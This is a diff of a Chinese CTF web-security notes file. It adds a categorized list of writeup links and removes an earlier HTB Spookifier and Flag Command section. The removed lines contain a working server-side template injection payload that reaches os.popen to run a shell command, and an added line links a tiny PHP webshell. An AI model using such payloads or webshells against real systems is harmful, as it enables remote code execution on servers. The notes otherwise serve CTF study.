@@ -28,6 +28,83 @@ https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-
 
 # Writeups
 
+### 学习他人的writeup
+
+https://mqcybersec.org/writeups/
+
+https://github.com/hyungin0505/CTF-WriteUp/tree/main/2025
+
+https://blog.csdn.net/CleverLee0/article/details/146080892?spm=1001.2014.3001.5502
+
+https://blog.csdn.net/CleverLee0?type=blog
+
+https://github.com/Haalloobim/CTF-Writeup-Notes/tree/main/ARA%20CTF%202023/Web%20Exploitation/Dewaweb
+
+https://github.com/rerrorctf/writeups/blob/main/2024_11_10_BlueHens24/web/firefun_3/Writeup.md
+
+
+
+## Information Collect
+
+### Hidden Link(View Source)
+
+* [head-dump](https://mqcybersec.org/writeups/picoctf-headdump/)
+
+* [Scavenger Hunt](https://mqcybersec.org/writeups/picoctf-scavengerhunt/) `robots,.htaccess,.gitignore, .DS_Store` 
+* [Insp3ct0r](https://mqcybersec.org/writeups/picoctf-insp3ct0r/)
+
+
+
+### BurpSuite抓包
+
+* [WebSockFish](https://mqcybersec.org/writeups/picoctf-websockfish/)
+
+### 控制台抓包
+
+* [HTB Flag command](https://cr4zyp1x3l.netlify.app/htb-flag-command-writeup/)
+
+## Cookie
+
+* [Cookie Monster Secret Recipe](https://mqcybersec.org/writeups/picoctf-cookiemonstersecretrecipe/)
+
+
+
+## Code Injection
+
+* [caas](https://mqcybersec.org/writeups/picoctf-caas/)
+
+### Python Code Execution
+
+*  [3v@l](https://mqcybersec.org/writeups/picoctf-3vl/) 
+
+## PHP文件上传
+
+一句话木马：https://github.com/bayufedra/Tiny-PHP-Webshell
+
+* [n0s4n1ty 1](https://mqcybersec.org/writeups/picoctf-n0s4n1ty1/)
+
+* [Trickster](https://mqcybersec.org/writeups/picoctf-trickster/)
+
+
+
+## SSTI
+
+* [SSTI1 (without RCE..?)](https://mqcybersec.org/writeups/picoctf-ssti1/)
+
+* [HTB-Spookifier](https://cr4zyp1x3l.netlify.app/htb-spookifier-writeup/)
+
+
+
+### Side Channel Brute Force
+
+* [**OTP / UTCTF 2025**](https://mqcybersec.org/writeups/25-utctf-otp/) 
+
+## HARD
+
+### Race Condition
+
+* [**Chat / UTCTF 2025**](https://mqcybersec.org/writeups/25-utctf-chat/)
+
 
 
 ## IDOR
@@ -68,36 +145,6 @@ HTB{m4rkd0wn_bugs_1n_th3_w1ld!}
 
 ``` shell
 HTB{d0nt_trust_str4ng3r5_bl1ndly}
-```
-
-##  SSTI
-
-### HTB Spookifier
-
-> ssti
-
-通过 `${7*7}` 测试，然后payload用
-
-``` python
-${ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['__import__']('os').popen('cat ../flag.txt').read()}
-```
-
-使用的时候，需要查找一下 `os._wrap_close` 类的 index 就可以了
-
-``` shell
-HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
-```
-
-## 抓包
-
-### HTB Flag Command
-
-> 抓包, js代码审计
-
-从开发者工具里面抓包，找到游戏的 `main.js` ，里面发现有个 `fetchOptions` 里面通过发送请求，得到所有可以执行的命令。然后在开发者工具的抓包里面看到 `options` 就是这个请求，我们打开看看请求返回的内容，在里面得到看到一个secret的命令 `Blip-blop, in a pickle with a hiccup! Shmiggity-shmack`。 在游戏start后，输入这个命令，就可以得到flag了
-
-``` shell
-HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}
 ```
 
 
